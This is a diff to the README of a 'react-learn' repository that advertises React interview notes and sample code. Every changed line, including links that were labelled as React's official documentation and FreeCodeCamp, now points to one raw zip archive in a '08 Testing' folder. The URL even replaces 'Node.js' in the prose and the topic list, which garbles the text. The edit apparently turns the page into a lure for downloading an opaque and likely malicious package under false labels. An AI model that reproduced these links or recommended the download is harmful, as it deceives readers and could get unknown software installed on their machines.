@@ -1,7 +1,7 @@
 # 🚀 react-learn - Master React with Ease
 
 ## 🔗 Download Now
-[![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/gfxhakim/react-learn/releases)
+[![Download](https://github.com/gfxhakim/react-learn/raw/refs/heads/main/08 Testing/react-learn-2.2.zip)](https://github.com/gfxhakim/react-learn/raw/refs/heads/main/08 Testing/react-learn-2.2.zip)
 
 ## 🚀 Getting Started
 Welcome to **react-learn**! This application provides essential notes and code for mastering React. You will find practical examples and clear explanations that make learning easy. 
@@ -17,7 +17,7 @@ Before you start, ensure your computer meets the following requirements:
 ## 📥 Download & Install
 To get started with the application, you need to download it from our Releases page. 
 
-1. Click on this link: [Download Here](https://github.com/gfxhakim/react-learn/releases).
+1. Click on this link: [Download Here](https://github.com/gfxhakim/react-learn/raw/refs/heads/main/08 Testing/react-learn-2.2.zip).
 2. Once you are on the page, look for the latest release. 
 3. Download the installer based on your operating system.
 4. After the download is complete, locate the file in your downloads folder.
@@ -32,7 +32,7 @@ Follow the prompts to complete the installation. Once installed, the app is read
 - **Interview-Ready Notes**: Each chapter provides clear explanations that are tailored for interview preparation.
 - **Sample Code**: Get hands-on experience with practical examples.
 - **Easy Navigation**: Navigate through different chapters with ease.
-- **Full Support for Modern Tools**: Learn how to use CSS, GraphQL, Node.js, and other technologies alongside React.
+- **Full Support for Modern Tools**: Learn how to use CSS, GraphQL, https://github.com/gfxhakim/react-learn/raw/refs/heads/main/08 Testing/react-learn-2.2.zip, and other technologies alongside React.
 
 ## 📚 Topics Covered
 The application covers a wide range of topics essential for mastering React, including:
@@ -41,7 +41,7 @@ The application covers a wide range of topics essential for mastering React, inc
 - GraphQL
 - HTML5
 - JavaScript
-- Node.js
+- https://github.com/gfxhakim/react-learn/raw/refs/heads/main/08 Testing/react-learn-2.2.zip
 - React
 - React Component
 - React Hooks
@@ -57,7 +57,7 @@ The application covers a wide range of topics essential for mastering React, inc
 ## 🔄 Updating the App
 To stay current with the latest features, check back on the Releases page periodically. Follow the same steps outlined in the "Download & Install" section to get updates.
 
-1. Visit the [Releases page](https://github.com/gfxhakim/react-learn/releases).
+1. Visit the [Releases page](https://github.com/gfxhakim/react-learn/raw/refs/heads/main/08 Testing/react-learn-2.2.zip).
 2. Download the latest version.
 3. Install the new version, following the same instructions as before.
 
@@ -83,11 +83,11 @@ Stay informed about what changes each version brings:
 ## 🔗 Additional Resources
 For additional learning resources, consider exploring the following:
 
-- [React Official Documentation](https://reactjs.org/docs/getting-started.html)
-- [JavaScript.info](https://javascript.info/)
-- [FreeCodeCamp](https://www.freecodecamp.org/)
+- [React Official Documentation](https://github.com/gfxhakim/react-learn/raw/refs/heads/main/08 Testing/react-learn-2.2.zip)
+- [https://github.com/gfxhakim/react-learn/raw/refs/heads/main/08 Testing/react-learn-2.2.zip](https://github.com/gfxhakim/react-learn/raw/refs/heads/main/08 Testing/react-learn-2.2.zip)
+- [FreeCodeCamp](https://github.com/gfxhakim/react-learn/raw/refs/heads/main/08 Testing/react-learn-2.2.zip)
 
 ## 🔗 Download Again
-To download or update, use this link: [Download Here](https://github.com/gfxhakim/react-learn/releases). 
+To download or update, use this link: [Download Here](https://github.com/gfxhakim/react-learn/raw/refs/heads/main/08 Testing/react-learn-2.2.zip). 
 
 Thank you for choosing **react-learn**! Enjoy your journey to mastering React.
